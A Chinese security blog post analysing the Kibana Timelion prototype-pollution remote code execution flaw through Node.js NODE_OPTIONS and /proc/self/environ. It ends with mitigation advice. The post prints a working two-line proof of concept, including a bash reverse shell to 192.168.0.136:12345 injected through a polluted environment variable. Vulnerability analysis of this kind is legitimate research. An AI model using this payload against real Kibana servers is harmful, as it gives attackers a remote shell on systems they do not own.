## 背景介绍：

 **Elasticsearch
Kibana是荷兰Elasticsearch公司的一套开源的、基于浏览器的分析和搜索Elasticsearch仪表板工具，作为Elasticsearch的核心组件，Kibana可作为产品或服务提供，并与各种系统，产品，网站和企业中的其他Elastic
Stack产品配合使用。 由于Kibana在大数据领域用途较为广泛，此次漏洞影响范围较大。**

## Nodejs的子进程创建

如何获取客户端参数的代码写在了proccess.js中，我们关注下客户端参数解析

![](https://image.3001.net/images/20191021/1571636819_5dad46534eefe.png!small)

以上代码是nodejs的 **exec** 方法的核心代码(卧槽，node自举了)。 可以看到代码调用了

normalizeExecArgs(command,options, callback);

而其中的options，是我们传入的命令行的参数，这个函数又调用了

function normalizeSpawnArguments，而这个函数又调用了execFile，而execFile调用了spawn，而在spawn
里定义了这样的代码

    
    
    const env =options.env || process.env;  获取客户端的options
    
          const envPairs = [];
    
          // process.env.NODE_V8_COVERAGE alwayspropagates, making it possible to
    
          // collect coverage for programs that spawnwith white-listed environment.
    
          if (process.env.NODE_V8_COVERAGE &&
    
             !ObjectPrototype.hasOwnProperty(options.env || {}, 'NODE_V8_COVERAGE')){
    
            env.NODE_V8_COVERAGE =process.env.NODE_V8_COVERAGE;
    
          }
    
          // Prototype values are intentionallyincluded
    
          for (const key in env) {
    
            const value = env[key];
    
            if (value !== undefined) {
    
              envPairs.push(`${key}=${value}`);
    
            }
    
          }

简单来说，客户端传入了options选项，那么就根据客户端的来处理，否则就去获取系统环境变量。

## 作者核心点

在这里我得提一下作者的思路

作者在命令行下尝试了

    
    
    NODE_OPTIONS=’--require/proc/self/environ’ AAA=’cosole.log(123)//’ node

这是在shell里设置了一个NODE_OPTIONS的值和AAA环境变量，其中NODE_OPTIONS是可以这么写的，官方允许传递这样的参数，具体的文档在<http://nodejs.cn/api/cli/node_options_options.html>

内容是

![](https://image.3001.net/images/20191021/1571636985_5dad46f95f0ca.png!small)

作者做这个实验的核心目的就是表达，我在shell下传递options可以包含环境变量来执行代码也可以通过污染原型链来设置环境变量，console.log这个地方就是任意的nodejs表达式，包括执行命令的，这个是为了实验。

## 关于.env和process.env和/proc/self/environ

官方解释：process 对象是一个 global （全局变量），提供有关信息，控制当前 Node.js
进程。该对象表示Node所处的当前进程，允许开发者与该进程互动。打开命令行，输入node，再输入process.env，可以看见process.env是一个对象。这个对象在kibana这里就是有很多属性，我们污染的这个NODE_OPTIONS就是这个env的属性之一，其实还有NODE_ENV之类的属性。还有版本之类的。

根据子进程创建的逻辑，我们是否可以构造一个恶意的代码来污染原型链，因为代码里写了如果没定义process.env就去调用系统的环境变量，而根据javascript规则，我们随意设置一个对象的_proto_的env就可以覆盖掉process的env属性了，这样的话我们可以就定义好了，定义并且赋值就不会undefined了。

简单的说就是object.env下的属性就会被写入到/proc/self/environ里。

所以poc的下半句是

    
    
    .props(label.__proto__.env.NODE_OPTIONS='--require/proc/self/environ')

根据作者核心思路“在shell下传递options可以包含环境变量来执行代码也可以通过污染原型链来设置环境变量”，我们开始尝试使用代码来设置环境变量而不是shell。

而/proc/self/environ就和php一样的，如果你设置了进程的环境变量，那么在运行的时候通过linux下/proc/self/environ可以读取进程的环境变量

## 如何在代码里设置环境变量？

答案是通过原型链污染，我们先污染object.env，也就是设置label.__proto__.env.NODE_OPTIONS，这样的话我们去访问process.env.NODE_OPTIONS就是我们设置的值，根据上面nodejs核心代码child_process.js的逻辑，我们传递的options最终会变成spawn的一个参数
，作为环境变量执行。

## 文件包含获得shell

最后我们通过label.__proto__.env.NODE_OPTIONS='--require/proc/self/environ'
的设置了process.env.NODE_OPTIONS的值，被node读取到了，然后根据官方手册里写的，相当于运行了node --require
“xxx.xxx” (就和php里的include 一样，node require的不一定非要是js文件，就和php不一定要是php文件一样)

Poc的另外一句话是：

    
    
    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash-i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')

这里的AAA也是会被写入到/proc/self/environ，最后的环境变量应该是

    
    
    AAA= require("child_process").exec("bash-i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//NODE_OPTIONS=--require/proc/self/environYarn_VERSION=1.17.3HOSTNAME=7da7727ddePWD=balabalabalabala#^&*(*&^%$

因为//是注释，所以后面忽略，然后这个文件被当作require的参数包含起来了，里面的代码自然就执行了。

## 几个重要的知识：

> 1、设置了xx.env.aaa的内容会被写入/proc/self/environ里，怎么设置？通过原型链
>
> 2、Poc设置了2个环境变量，一个被注释了
>
> 3、NODE_OPTIONS自nodeV8.0.0后才开始(如果你没成功，那么可以排查下nodejs的版本

## 总结

> 聪明的你肯定知道 还有其他的办法可以RCE！可以利用的地方很多，原型链撕开了一个攻击面，而NODE_OPTIONS只是一个点。
>
> 根据对抗原型链攻击的办法可以使用Object.freeze来冻结原型链操作，但是这样会导致一些隐性的bug，如果你不熟悉javascript的话。
>
> 最佳的修复还是升级版本吧

 ***本文原创作者：NotFound，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

